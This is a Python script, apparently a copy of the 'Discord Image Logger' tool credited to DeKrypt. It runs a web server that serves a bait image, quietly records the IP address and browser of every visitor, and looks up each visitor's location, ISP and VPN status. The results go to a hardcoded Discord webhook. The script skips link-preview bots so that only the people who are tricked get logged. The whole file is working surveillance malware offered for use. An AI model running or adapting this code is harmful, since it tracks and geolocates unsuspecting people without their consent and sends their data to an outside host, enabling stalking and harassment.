# Discord Image Logger
# By DeKrypt | Fixed Mirror

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import requests, httpagentparser

_app_ = "Discord Image Logger"
__description__ = "Steals IPs via Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    "webhook": "https://discord.com/api/webhooks/1410895727873495100/L_6XLT65BoAVy3qw8yeBAxN_bjOucJKGL6O1mxErFo2SyQY0Z8eNaFkB65ODQwsZcHTX",
    "image": "https://notepad-plus-plus.org/assets/images/notepad4ever.png",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {"doMessage": False, "message": "This browser has been pwned by DeKrypt's Image Logger.", "richMessage": True},
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {"redirect": False, "page": "https://your-link.here"},
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34","35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{"title": "Image Logger - Error","color": config["color"],"description": f"An error occurred!\n```\n{error}\n```"}]
    })

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, image_url=None):
    if ip.startswith(blacklistedIPs):
        return

    bot = botCheck(ip, useragent)

    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "content": "",
                "embeds": [{
                    "title": "Image Logger - Link Sent",
                    "color": config["color"],
                    "description": f"**Image Logging Link Sent!**\n**Endpoint:** {endpoint}\n**IP:** {ip}\n**Platform:** {bot}",
                    "image": {"url": image_url or config["image"]}
                }]
            })
        return

    ping = "@everyone"
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    except:
        info = {}

    os_name, browser = httpagentparser.simple_detect(useragent)

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** {endpoint}

**IP Info:**
> **IP:** {ip or 'Unknown'}
> **Provider:** {info.get('isp','Unknown')}
> **ASN:** {info.get('as','Unknown')}
> **Country:** {info.get('country','Unknown')}
> **Region:** {info.get('regionName','Unknown')}
> **City:** {info.get('city','Unknown')}
> **Coords:** {str(info.get('lat','Unknown')) + ',' + str(info.get('lon','Unknown')) if not coords else coords.replace(',',',')}
> **Timezone:** {info.get('timezone','Unknown')}
> **Mobile:** {info.get('mobile','Unknown')}
> **VPN:** {info.get('proxy',False)}
> **Bot:** {"Possibly" if info.get('hosting',False) else "False"}

**PC Info:**
> **OS:** {os_name}
> **Browser:** {browser}

**User Agent:**
{useragent}
""",
            "image": {"url": image_url or config["image"]}
        }]
    }

    requests.post(config["webhook"], json=embed)

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            query = parse.urlparse(self.path).query
            params = parse.parse_qs(query)
            img_url = params.get("url",[config["image"]])[0]

            user_ip = self.client_address[0]
            user_agent = self.headers.get('User-Agent', 'Unknown')
            makeReport(user_ip, user_agent, endpoint=self.path, url=True, image_url=img_url)

            if config["redirect"]["redirect"]:
                self.send_response(302)
                self.send_header('Location', config["redirect"]["page"])
                self.end_headers()
            else:
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(f'<img src="{img_url}" alt="Image">'.encode())
        except Exception as e:
            reportError(e)
            self.send_response(500)
            self.end_headers()

def run_server():
    port = 8080
    server = HTTPServer(('0.0.0.0', port), Handler)
    print(f"{_app_} running on port {port}")
    server.serve_forever()

if __name__ == "__main__":
    run_server()
